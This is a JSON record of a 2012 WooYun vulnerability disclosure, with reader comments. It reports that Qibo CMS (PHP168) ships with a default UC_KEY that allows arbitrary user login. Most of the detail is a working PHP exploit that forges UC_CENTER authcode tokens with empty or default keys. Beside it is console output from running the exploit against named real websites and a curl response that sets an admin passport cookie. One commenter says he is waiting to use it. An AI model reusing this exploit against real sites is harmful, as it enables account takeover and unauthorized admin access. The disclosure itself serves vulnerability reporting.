{"id": 17296, "wybug_id": "wooyun-2012-010939", "wybug_title": "齐博cms整站系统（原PHP168）配置不当导致任意用户登陆", "wybug_corp": "PHP168", "wybug_author": "牛奶坦克", "wybug_date": "2012-08-15 15:35", "wybug_open_date": "2012-09-29 15:36", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-08-15：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-09-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 齐博cms整站系统（原PHP168）配置不当导致任意用户登陆，比如cms管理员等。 详细说明：  还是由于UC_CENTER的问题，之前闹过UC_KEY变量为空时可以调用UC_CENTER中的相关用户API直接进行操作，今天下了一份V7版本的源码，在uc_config.php中发现UC_KEY被初始化了\ndefine('UC_DBCONNECT', '0');define('UC_KEY', 'fdsafd43');  //这里做了初始化define('UC_API', 'http://v7.com/dz/uc_server');\nGoogle了一把，发现很多站都可以用空的UC_KEY或默认的UC_KEY成功调用UC接口。   漏洞证明：  从官方成功案例中找到一个网站\n$ php uc.php haidian.10000tc.com synlogin[+] UC_KEY 'null' can use .[*] EXP = do/api/uc.php?code=fca08oORxQ3xNG01MA1KO9cEPCcedNTThklj6RW2mzYoO9ReaVA4D6XZPJ06GSY0xrpCwNQD6YfusbP1nPJG0HsSB95BkMT6FcarqAVEamHr$ php uc.php 0755456.com synlogin[+] UC_KEY 'default' can use .[*] EXP = do/api/uc.php?code=c788q%2Byp%2F4oC5rvSuzpCpuLHRIYu9VIR%2Bzl8pJ60hOX8xYAxKoBajYXvRFG72oAadPVjFlAy8n6565gMUXPZNeKBXSQP0SDBJ9JPvq4XkLf4$ php uc.php www.zjxiaoyifeng.com synlogin[+] UC_KEY 'default' can use .[*] EXP = do/api/uc.php?code=7755%2FC0y9ZruP9op7MtO5lPx92MRfmUImcEf3ZmVIvDDjl8zpfKI%2FTEU6PwkKbW8QioWTD7nai2FaauVyAVTwICk6mrQwLvS6dsNawJyoPX5\n看看是否set cookie\n$ curl -I \"http://haidian.10000tc.com/do/api/uc.php?code=fca08oORxQ3xNG01MA1KO9cEPCcedNTThklj6RW2mzYoO9ReaVA4D6XZPJ06GSY0xrpCwNQD6YfusbP1nPJG0HsSB95BkMT6FcarqAVEamHr\"HTTP/1.0 200 OKDate: Wed, 15 Aug 2012 06:23:32 GMTContent-Type: text/html; charset=gb2312Server: Microsoft-IIS/6.0X-Powered-By: ASP.NETX-Powered-By: PHP/5.2.8Set-Cookie: USR=lju34nhv%090%091345011812%09http%3A%2F%2Fhaidian.10000tc.com%2Fdo%2Fapi%2Fuc.php%3Fcode%3Dfca08oORxQ3xNG01MA1KO9cEPCcedNTThklj6RW2mzYoO9ReaVA4D6XZPJ06GSY0xrpCwNQD6YfusbP1nPJG0HsSB95BkMT6FcarqAVEamHr; expires=Thu, 16-Aug-2012 06:23:32 GMT; path=/; domain=10000tc.comSet-Cookie: choose_cityID=1; expires=Fri, 14-Sep-2012 06:23:32 GMT; path=/; domain=10000tc.comSet-Cookie: zone_id=1; expires=Fri, 14-Sep-2012 06:23:32 GMT; path=/; domain=10000tc.comP3P: CP=\"CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR\"Set-Cookie: passport=1%09admin%09AFVdAg1SUwZVD1QDAFVdBwdXA1VRVAYAUAxXAFdUUlc%3D289d3139c3; expires=Thu, 16-Aug-2012 06:23:32 GMT; path=/; domain=10000tc.comX-Cache: MISS from WT263CDN-21172X-Cache-Lookup: MISS from WT263CDN-21172:80Via: 1.0 WT263CDN-21172 (squid/3.0.STABLE20)Connection: close\nset了，在登陆网站试试\n\n\n\nexp:\n<?phperror_reporting(0);$host = $argv[1];$doing = $argv[2];    if (empty($doing)) {        $doing = 'test';        $code = 'time=1577811661&action='.$doing;    } else {        $code = 'time=1577811661&uid=1&username=admin&action='.$doing;    }$uc_key = array('null' => '', 'default' => 'fdsafd43');foreach ($uc_key as $key => $value) {    $exp = 'do/api/uc.php?code='.urlencode(authcode($code, \"ENCODE\", $value));    $result = file_get_contents(\"http://$host/$exp\");    if( $result == 1 || $result !== 'Authracation has expiried'){       echo \"[+] UC_KEY '$key' can use .\\r\\n\";       echo \"[*] EXP = $exp \\r\\n\";    }}function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {     $ckey_length = 4;     $key = md5($key ? $key : UC_KEY);    $keya = md5(substr($key, 0, 16));    $keyb = md5(substr($key, 16, 16));    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';     $cryptkey = $keya.md5($keya.$keyc);    $key_length = strlen($cryptkey);     $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;    $string_length = strlen($string);     $result = '';    $box = range(0, 255);     $rndkey = array();    for($i = 0; $i <= 255; $i++) {        $rndkey[$i] = ord($cryptkey[$i % $key_length]);    }     for($j = $i = 0; $i < 256; $i++) {        $j = ($j + $box[$i] + $rndkey[$i]) % 256;        $tmp = $box[$i];        $box[$i] = $box[$j];        $box[$j] = $tmp;    }     for($a = $j = $i = 0; $i < $string_length; $i++) {        $a = ($a + 1) % 256;        $j = ($j + $box[$a]) % 256;        $tmp = $box[$a];        $box[$a] = $box[$j];        $box[$j] = $tmp;        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));    }     if($operation == 'DECODE') {        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {            return substr($result, 26);        } else {            return '';        }    } else {        return $keyc.str_replace('=', '', base64_encode($result));    } }\n   修复方案：  安装的时候随即字符串重写。   版权声明：转载请注明来源 牛奶坦克@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2012-08-16 14:34 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  前排围观~~    \n     2012-08-16 23:42 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  等用~~    \n     2012-08-17 15:40 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  前排围观~~    \n     2012-08-17 21:30 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  逻辑哥,有泡妹子的妹子没。    \n     2012-08-18 20:24 |    \t\t冷bing \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 你懂的、。)\t\t \n  围观一下。    \n     2013-02-16 23:22 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  这个不能登录后台么。这个只是会员的那个页面，后台还要让登录啊。求指导    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}